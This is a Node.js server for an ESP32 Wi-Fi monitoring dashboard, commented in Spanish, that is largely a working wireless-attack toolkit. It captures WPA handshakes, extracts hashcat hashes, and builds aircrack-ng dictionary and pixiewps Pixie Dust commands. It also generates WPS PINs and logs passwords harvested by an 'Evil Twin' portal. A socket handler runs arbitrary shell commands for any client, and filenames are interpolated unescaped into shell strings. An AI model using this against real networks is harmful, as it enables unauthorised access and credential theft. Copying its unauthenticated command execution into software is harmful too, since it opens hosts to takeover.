const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { SerialPort } = require('serialport');
const { ReadlineParser } = require('@serialport/parser-readline');
const fs = require('fs');
const path = require('path');
const oui = require('oui'); // Fingerprinting de Hardware (MAC Vendor)
const { spawn } = require('child_process');
const sqlite3 = require('sqlite3').verbose();
const { parseDeepWps } = require('./wps_parser');
const { generateTopPins } = require('./mac_to_pin');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

io.on('connection', (socket) => {
    socket.on('send_cmd', (data) => {
        if (port && port.isOpen) {
            port.write(data.cmd + '\n');
            console.log(`[CMD ENVIADO] ${data.cmd}`);
        }
    });

    socket.on('run_terminal_cmd', (data) => {
        const { cmd, useWsl } = data;
        let finalCmd, args, options;

        if (useWsl) {
            // WSL con Kali Linux: especificar distro y usuario explícitamente
            // wsl -d kali-linux -u tosito bash -c "comando"
            finalCmd = 'wsl';
            args = ['-d', 'kali-linux', '-u', 'tosito', 'bash', '-c', cmd];
            options = { shell: false };
        } else {
            // Windows nativo: cmd /c ejecuta el comando en la shell
            finalCmd = 'cmd';
            args = ['/c', cmd];
            options = { shell: false };
        }

        io.emit('terminal_output', { text: `\n$ ${cmd}\n`, type: 'stdin' });

        try {
            const proc = spawn(finalCmd, args, options);

            proc.stdout.on('data', (d) => {
                io.emit('terminal_output', { text: d.toString(), type: 'stdout' });
            });

            proc.stderr.on('data', (d) => {
                io.emit('terminal_output', { text: d.toString(), type: 'stderr' });
            });

            proc.on('close', (code) => {
                io.emit('terminal_output', { text: `\n[Proceso terminado con código ${code}]\n`, type: 'system' });
            });

            proc.on('error', (err) => {
                io.emit('terminal_output', { text: `\n[Error al lanzar proceso: ${err.message}]\n`, type: 'stderr' });
            });
        } catch (e) {
            io.emit('terminal_output', { text: `\n[Error catastrófico: ${e.message}]\n`, type: 'stderr' });
        }
    });
});

app.use(express.static('public'));
app.use('/capturas', express.static(path.join(__dirname, 'capturas')));

let port = null;
const eapolState = {}; // Memoria para detectar KRACK (Replay Counters)
const apDictionary = {}; // Memoria para asociar BSSID a SSID

// ==========================================
// INICIALIZACIÓN DE LA BASE DE DATOS SQLITE
// ==========================================
const dbPath = path.join(__dirname, 'soc_data.db');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('[DB ERROR] Error abriendo la base de datos', err.message);
    } else {
        console.log('📁 Conectado a la base de datos SQLite (soc_data.db).');
        db.run(`CREATE TABLE IF NOT EXISTS networks (
            bssid TEXT PRIMARY KEY,
            ssid TEXT,
            vendor TEXT,
            mfp_protected BOOLEAN,
            pmkid BOOLEAN,
            wps_enabled BOOLEAN,
            wps_locked BOOLEAN,
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            max_rssi INTEGER
        )`);
        
        db.run(`CREATE TABLE IF NOT EXISTS probes (
            mac TEXT,
            vendor TEXT,
            ssid TEXT,
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            max_rssi INTEGER,
            PRIMARY KEY(mac, ssid)
        )`);

        db.run(`CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ssid TEXT,
            username TEXT,
            password TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )`);

        // Migración: Añadir columnas WPS si no existen
        db.run(`ALTER TABLE networks ADD COLUMN wps_enabled BOOLEAN`, (err) => {});
        db.run(`ALTER TABLE networks ADD COLUMN wps_locked BOOLEAN`, (err) => {});
        db.run(`ALTER TABLE networks ADD COLUMN wps_manufacturer TEXT`, (err) => {});
        db.run(`ALTER TABLE networks ADD COLUMN wps_model TEXT`, (err) => {});
        db.run(`ALTER TABLE networks ADD COLUMN wps_device_name TEXT`, (err) => {});
        db.run(`ALTER TABLE networks ADD COLUMN wps_method TEXT`, (err) => {});
        db.run(`ALTER TABLE networks ADD COLUMN wps_version TEXT`, (err) => {});
    }
});

// Analizador DPI (Deep Packet Inspection) para EAPOL
function analyzePcap(fullPath) {
    try {
        const buffer = fs.readFileSync(fullPath);
        let offset = 24; 
        let beacons = 0;
        let eapols = 0;
        let messages = new Set();
        while (offset + 16 <= buffer.length) {
            const inclLen = buffer.readUInt32LE(offset + 8);
            offset += 16;
            if (offset + inclLen > buffer.length) break;
            const packet = buffer.subarray(offset, offset + inclLen);
            offset += inclLen;
            if (packet.length < 24) continue;
            
            const fc = packet[0];
            const type = (fc >> 2) & 0x03;
            const subtype = (fc >> 4) & 0x0F;
            
            if (type === 0 && subtype === 8) {
                beacons++;
            } else if (type === 2) {
                const idx = packet.indexOf(Buffer.from([0x88, 0x8e]));
                if (idx !== -1 && idx + 7 < packet.length) {
                    eapols++;
                    // 0x88 0x8e (2 bytes, EtherType)
                    // Protocol Version (1 byte)
                    // Packet Type (1 byte)
                    // Packet Body Length (2 bytes)
                    // Key Descriptor Type (1 byte)
                    // Key Information (2 bytes) -> idx + 7 y idx + 8
                    
                    const keyInfo = packet.readUInt16BE(idx + 5);
                    const isMic = (keyInfo & 0x0100) !== 0; // Bit MIC
                    const isAck = (keyInfo & 0x0080) !== 0; // Bit ACK
                    const isInstall = (keyInfo & 0x0040) !== 0; // Bit Install
                    const isSecure = (keyInfo & 0x0200) !== 0; // Bit Secure

                    if (isAck && !isMic) messages.add("M1");
                    else if (!isAck && isMic && !isSecure) messages.add("M2");
                    else if (isAck && isMic && isInstall) messages.add("M3");
                    else if (!isAck && isMic && isSecure) messages.add("M4");
                }
            }
        }
        return { beacons, eapols, handshake: Array.from(messages).sort() };
    } catch (e) {
        return { beacons: 0, eapols: 0, handshake: [] };
    }
}

// Endpoint para listar capturas con Análisis Profundo
app.get('/api/capturas', (req, res) => {
    const filepath = path.join(__dirname, 'capturas');
    if (!fs.existsSync(filepath)) return res.json([]);
    const files = fs.readdirSync(filepath).filter(f => f.endsWith('.pcap'));
    const fileList = files.map(f => {
        const stat = fs.statSync(path.join(filepath, f));
        const analysis = analyzePcap(path.join(filepath, f));
        let ssid = 'Desconocido';
        let vendor = 'Unknown';
        const match = f.match(/^(captura|handshake)_AP_(?:.*_)?([0-9A-Fa-f]{12})\.pcap$/i);
        let isHandshake = false;
        if (match) {
            isHandshake = match[1].toLowerCase() === 'handshake';
            const macRaw = match[2].toUpperCase();
            ssid = apDictionary[macRaw] || 'Desconocido (Esperando baliza)';
            const macColon = macRaw.match(/.{1,2}/g).join(':');
            vendor = getVendor(macColon);
        }
        return { name: f, size: (stat.size / 1024).toFixed(2) + ' KB', time: stat.mtime, ssid, vendor, isHandshake, analysis };
    }).sort((a, b) => b.time - a.time);
    res.json(fileList);
});

// Función Inteligente para Resolver Fabricante
function getVendor(mac) {
    if (!mac) return 'Unknown';
    try {
        const result = oui(mac);
        if (result) return result.split('\n')[0].substring(0, 20); // Quedarnos con el nombre corto
        return 'Randomized / Unknown';
    } catch(e) {
        return 'Unknown';
    }
}

// Convierte ruta Windows a ruta WSL /mnt/c/...
function toWslPath(winPath) {
    return winPath
        .replace(/^([A-Za-z]):\\/, (_, drive) => `/mnt/${drive.toLowerCase()}/`)
        .replace(/\\/g, '/');
}

// Ejecuta un comando en Kali WSL y devuelve stdout/stderr
function runInKali(cmd) {
    return new Promise((resolve, reject) => {
        const proc = spawn('wsl', ['-d', 'kali-linux', '-u', 'tosito', 'bash', '-c', cmd], { shell: false });
        let out = '';
        let err = '';
        proc.stdout.on('data', d => out += d.toString());
        proc.stderr.on('data', d => err += d.toString());
        proc.on('close', code => resolve({ code, out, err }));
        proc.on('error', e => reject(e));
    });
}

// ==========================================
// ENDPOINT: Extractor HC22000 con hcxpcapngtool (Kali)
// ==========================================
app.post('/api/hashcat/extract', express.json(), async (req, res) => {
    const filename = req.body.filename;
    if (!filename) return res.status(400).json({ success: false, error: 'Archivo no especificado' });

    const pcapWin = path.join(__dirname, 'capturas', filename);
    const hcFilename = filename.replace('.pcap', '.hc22000');
    const hcWin = path.join(__dirname, 'capturas', hcFilename);

    const pcapWsl = toWslPath(pcapWin);
    const hcWsl = toWslPath(hcWin);

    try {
        // Usar hcxpcapngtool de Kali (mucho más fiable que Python/Scapy)
        const { code, out, err } = await runInKali(`hcxpcapngtool "${pcapWsl}" -o "${hcWsl}" 2>&1`);

        if (!fs.existsSync(hcWin) || fs.statSync(hcWin).size === 0) {
            return res.status(500).json({
                success: false,
                error: `hcxpcapngtool no encontró handshakes completos (M1+M2) en el PCAP.\n\nSalida de la herramienta:\n${out || err}`
            });
        }

        const hashContent = fs.readFileSync(hcWin, 'utf8').trim();
        const hashLines = hashContent.split('\n').filter(l => l.trim());

        // Parsear metadatos básicos del hash WPA*02
        const hashes = hashLines.map(hash => {
            const parts = hash.split('*');
            return {
                hash,
                ssid: parts[5] ? Buffer.from(parts[5], 'hex').toString('utf8').replace(/[^\x20-\x7E]/g, '?') : 'Desconocido',
                bssid: (parts[3] || '').match(/.{2}/g)?.join(':').toUpperCase() || '?',
                client: (parts[4] || '').match(/.{2}/g)?.join(':').toUpperCase() || '?',
                mic: parts[6] || '?',
                anonce: parts[7] || '?',
                messages_captured: ['M1', 'M2']
            };
        });

        console.log(`[HASHCAT/Kali] ${hashLines.length} hash(es) extraído(s) → ${hcFilename}`);
        res.json({
            success: true,
            total: hashes.length,
            packets_analyzed: '(hcxpcapngtool)',
            ssids_found: [...new Set(hashes.map(h => h.ssid))],
            hashes,
            hc22000_file: hcFilename
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ==========================================
// ENDPOINT: Aircrack-ng (ataque diccionario directo sobre .pcap)
// ==========================================
app.post('/api/aircrack/crack', express.json(), async (req, res) => {
    const { filename, wordlist } = req.body;
    if (!filename) return res.status(400).json({ success: false, error: 'Archivo no especificado' });

    const pcapWsl = toWslPath(path.join(__dirname, 'capturas', filename));
    const wl = wordlist || '/usr/share/wordlists/rockyou.txt';

    // Comando que: (1) descomprime rockyou si es necesario, (2) lanza aircrack
    const cmd = [
        // Descomprimir rockyou.txt si solo existe .gz
        `if [ ! -f "${wl}" ] && [ -f "${wl}.gz" ]; then`,
        `  echo "[*] Descomprimiendo $(basename ${wl}).gz ...";`,
        `  sudo gzip -d -k "${wl}.gz";`,
        `fi`,
        // Si sigue sin existir, usar la wordlist integrada de fasttrack
        `if [ ! -f "${wl}" ]; then`,
        `  echo "[!] ${wl} no encontrado, usando fasttrack.txt";`,
        `  WL="/usr/share/wordlists/fasttrack.txt";`,
        `else`,
        `  WL="${wl}";`,
        `fi`,
        `aircrack-ng "${pcapWsl}" -w "$WL" 2>&1`
    ].join('\n');

    res.json({ success: true, command: cmd });
});

// ==========================================
// ENDPOINT: Extractor de Pixie Dust (via hcxpcapngtool + pixiewps)
// ==========================================
app.post('/api/pixie/extract', express.json(), async (req, res) => {
    const filename = req.body.filename;
    if (!filename) return res.status(400).json({ success: false, error: 'Archivo no especificado' });

    const pcapWsl = toWslPath(path.join(__dirname, 'capturas', filename));

    try {
        // Extraer parámetros EAPOL WPS con hcxpcapngtool en modo WPS
        const { code, out, err } = await runInKali(`hcxpcapngtool "${pcapWsl}" --wpsout=- 2>&1`);

        if (!out || out.trim().length === 0) {
            return res.status(500).json({
                success: false,
                error: `No se encontraron paquetes WPS EAPOL (M1-M3) en el PCAP.\nSalida: ${err || 'Sin datos'}`
            });
        }

        // Si hay salida WPS, construir el comando pixiewps con esos parámetros
        const command = `pixiewps ${out.trim()}`;
        res.json({ success: true, command, rawWps: out.trim() });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ==========================================
// ENDPOINT: Generador de PINs WPS Algorítmicos
// ==========================================
app.get('/api/wps/pins', (req, res) => {
    const bssid = req.query.bssid;
    if (!bssid) return res.status(400).json({ error: 'Parámetro ?bssid requerido.' });
    
    const pins = generateTopPins(bssid);
    res.json({ success: true, bssid, pins });
});

app.get('/api/ports', async (req, res) => {

    try {
        const ports = await SerialPort.list();
        res.json(ports);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==========================================
// ENDPOINTS DE LA BASE DE DATOS
// ==========================================
app.get('/api/db/networks', (req, res) => {
    db.all("SELECT * FROM networks ORDER BY last_seen DESC", [], (err, rows) => {
        if (err) return res.status(500).json({error: err.message});
        res.json(rows);
    });
});

app.get('/api/db/probes', (req, res) => {
    db.all("SELECT * FROM probes ORDER BY last_seen DESC", [], (err, rows) => {
        if (err) return res.status(500).json({error: err.message});
        res.json(rows);
    });
});

app.get('/api/db/credentials', (req, res) => {
    db.all("SELECT * FROM credentials ORDER BY timestamp DESC", [], (err, rows) => {
        if (err) return res.status(500).json({error: err.message});
        res.json(rows);
    });
});

app.post('/api/connect', express.json(), (req, res) => {
    const comPort = req.body.port;
    if (port && port.isOpen) {
        port.close();
    }

    try {
        port = new SerialPort({ path: comPort, baudRate: 921600 });
        const parser = port.pipe(new ReadlineParser({ delimiter: '\n' }));

        port.on('open', () => {
            console.log(`[+] Conectado al ESP32 en ${comPort}`);
            io.emit('sys_message', { type: 'success', msg: `Conectado a ${comPort}` });
            res.json({ success: true });
        });

        port.on('error', (err) => {
            io.emit('sys_message', { type: 'error', msg: err.message });
        });

        parser.on('data', (line) => {
            try {
                const data = JSON.parse(line.trim());
                
                // Aprender SSIDs para asociarlos a los PCAP
                if (data.bssid && data.ssid && data.ssid !== "<Red_Oculta>") {
                    apDictionary[data.bssid.replace(/:/g, '').toUpperCase()] = data.ssid;
                }

                // --- INTELIGENCIA DE SEÑALES (SIGINT ENRIQUECIMIENTO) ---
                if (data.client) data.vendor = getVendor(data.client);
                if (data.src) data.src_vendor = getVendor(data.src);
                if (data.rogue_mac) data.rogue_vendor = getVendor(data.rogue_mac);
                if (data.bssid) data.ap_vendor = getVendor(data.bssid);

                // Calcular aproximación de distancia por RSSI
                if (data.rssi) {
                    if (data.rssi > -50) data.distance = 'Muy Cerca (0-5m)';
                    else if (data.rssi > -70) data.distance = 'Cerca (5-15m)';
                    else data.distance = 'Lejos (>15m)';
                }

                // --- DETECCIÓN DE KRACK (Anomalía en Handshakes EAPOL) ---
                if (data.event === 'eapol_handshake' && data.pcap_raw_hex) {
                    const hex = data.pcap_raw_hex;
                    const idx = hex.toLowerCase().indexOf('888e');
                    if (idx !== -1 && hex.length > idx + 48) {
                        const replayCounter = hex.substring(idx + 34, idx + 50); // EAPOL Replay Counter
                        const key = `${data.src}_${data.dst}`;
                        if (eapolState[key] && eapolState[key] === replayCounter) {
                            io.emit('ids_event', { event: 'alert', type: 'krack_attempt', src: data.src, dst: data.dst, rssi: data.rssi, distance: data.distance });
                        }
                        eapolState[key] = replayCounter;
                    }
                }

                // --- GUARDAR EN BASE DE DATOS (PERSISTENCIA) ---
                if (data.event === 'audit' && data.bssid) {
                    db.run(`INSERT INTO networks (bssid, ssid, vendor, mfp_protected, pmkid, wps_enabled, wps_locked, max_rssi) 
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?) 
                            ON CONFLICT(bssid) DO UPDATE SET 
                            last_seen = CURRENT_TIMESTAMP,
                            ssid = CASE WHEN excluded.ssid != '<Red_Oculta>' THEN excluded.ssid ELSE networks.ssid END,
                            max_rssi = CASE WHEN excluded.max_rssi > networks.max_rssi THEN excluded.max_rssi ELSE networks.max_rssi END,
                            mfp_protected = excluded.mfp_protected,
                            pmkid = excluded.pmkid,
                            wps_enabled = excluded.wps_enabled,
                            wps_locked = excluded.wps_locked`, 
                    [data.bssid, data.ssid, data.ap_vendor, data.mfp_protected, data.pmkid, data.wps_enabled, data.wps_locked, data.rssi]);
                }
                if (data.event === 'probe_req' && data.client && data.searching_ssid) {
                    db.run(`INSERT INTO probes (mac, vendor, ssid, max_rssi) 
                            VALUES (?, ?, ?, ?) 
                            ON CONFLICT(mac, ssid) DO UPDATE SET 
                            last_seen=CURRENT_TIMESTAMP, 
                            max_rssi=MAX(max_rssi, excluded.max_rssi)`,
                        [data.client, data.vendor, data.searching_ssid, data.rssi]);
                }
                if (data.event === 'credentials') {
                    db.run(`INSERT INTO credentials (ssid, username, password) VALUES (?, ?, ?)`, [data.ssid, data.username, data.password]);
                    io.emit('sys_message', { type: 'success', msg: `🔑 CREDENCIALES CAPTURADAS EN EL EVIL TWIN: [Usuario: ${data.username} | Pass: ${data.password}]` });
                }

                io.emit('ids_event', data);
                
                // Guardar PCAP de los Handshakes y Beacons interceptados
                if ((data.event === 'eapol_handshake' || data.event === 'audit' || data.event === 'pcap_dump') && data.pcap_raw_hex) {
                    guardarPcap(data);
                    
                    if (data.event === 'pcap_dump') {
                        const deepWps = parseDeepWps(data.pcap_raw_hex);
                        if (deepWps) {
                            db.run(`UPDATE networks SET wps_manufacturer = ?, wps_model = ?, wps_device_name = ?, wps_method = ?, wps_version = ? WHERE bssid = ?`,
                                [deepWps.manufacturer, deepWps.model, deepWps.device_name, deepWps.method, deepWps.version, data.bssid]);
                                
                            // Notificar al frontend
                            io.emit('ids_event', { event: 'wps_dpi', bssid: data.bssid, wps: deepWps });
                        }
                    }
                }
            } catch (e) {
                console.log("[ESP32 RAW] " + line);
            }
        });

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/flash', express.json(), (req, res) => {
    const comPort = req.body.port;
    if (!comPort) return res.status(400).json({ success: false, error: 'Puerto no especificado' });

    if (port && port.isOpen) {
        port.close();
    }

    const arduinoCliPath = "C:\\Users\\Tosito\\AppData\\Local\\Programs\\Arduino IDE\\resources\\app\\lib\\backend\\resources\\arduino-cli.exe";
    const sketchPath = path.join(__dirname, '..', 'esp32_ids', 'esp32_ids.ino');

    io.emit('flash_status', { status: 'started', msg: `Iniciando flasheo en ${comPort}...` });

    const flashProcess = spawn(arduinoCliPath, [
        'compile',
        '--fqbn', 'esp32:esp32:esp32',
        '--port', comPort,
        '--upload',
        sketchPath
    ]);

    flashProcess.stdout.on('data', (data) => {
        const text = data.toString();
        io.emit('flash_log', { type: 'stdout', text });
        console.log(`[FLASH] ${text.trim()}`);
    });

    flashProcess.stderr.on('data', (data) => {
        const text = data.toString();
        io.emit('flash_log', { type: 'stderr', text });
        console.error(`[FLASH ERROR] ${text.trim()}`);
    });

    flashProcess.on('close', (code) => {
        if (code === 0) {
            io.emit('flash_status', { status: 'success', msg: 'Flasheo completado con éxito.' });
            res.json({ success: true });
        } else {
            io.emit('flash_status', { status: 'error', msg: `Flasheo falló con código ${code}` });
            res.status(500).json({ success: false, error: `Error código ${code}` });
        }
    });
});

function guardarPcap(data) {
    const hex = data.pcap_raw_hex;
    const buffer = Buffer.from(hex, 'hex');
    const targetMac = data.bssid || data.src || data.dst || 'UNKNOWN';
    const macRaw = targetMac.replace(/:/g, '').toUpperCase();
    
    const rawSsid = apDictionary[macRaw] || 'Unknown';
    const safeSsid = rawSsid.replace(/[^a-zA-Z0-9_\-]/g, '_');
    const baseFilename = `${safeSsid}_${macRaw}.pcap`;
    
    const filepath = path.join(__dirname, 'capturas');
    if (!fs.existsSync(filepath)) fs.mkdirSync(filepath);

    const pathCaptura = path.join(filepath, `captura_AP_${baseFilename}`);
    const pathHandshake = path.join(filepath, `handshake_AP_${baseFilename}`);
    
    let targetPath = pathCaptura;

    // Si capturamos un handshake, promocionamos el archivo
    if (data.event === 'eapol_handshake') {
        if (fs.existsSync(pathCaptura)) {
            fs.renameSync(pathCaptura, pathHandshake); // Conservar el Beacon previo
        }
        targetPath = pathHandshake;
    } else {
        // Si es un beacon pero ya teníamos un handshake previo, lo adjuntamos al handshake
        if (fs.existsSync(pathHandshake)) {
            targetPath = pathHandshake;
        }
    }
    
    const isNew = !fs.existsSync(targetPath);
    const pcapHeader = Buffer.from([0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00]);
    const packetHeader = Buffer.alloc(16);
    const ts = Math.floor(Date.now() / 1000);
    const usec = (Date.now() % 1000) * 1000;
    packetHeader.writeUInt32LE(ts, 0); 
    packetHeader.writeUInt32LE(usec, 4);  
    packetHeader.writeUInt32LE(buffer.length, 8); 
    packetHeader.writeUInt32LE(buffer.length, 12); 

    if (isNew) {
        fs.writeFileSync(targetPath, Buffer.concat([pcapHeader, packetHeader, buffer]));
        if (data.event === 'eapol_handshake') io.emit('sys_message', { type: 'success', msg: `NUEVO PCAP CON HANDSHAKE: handshake_AP_${baseFilename}` });
    } else {
        fs.appendFileSync(targetPath, Buffer.concat([packetHeader, buffer]));
        if (data.event === 'eapol_handshake') io.emit('sys_message', { type: 'success', msg: `🔑 HANDSHAKE ADJUNTADO A: handshake_AP_${baseFilename}` });
    }
}

server.listen(3000, () => {
    console.log('🚀 Servidor Avanzado SOC iniciado en http://localhost:3000');
});
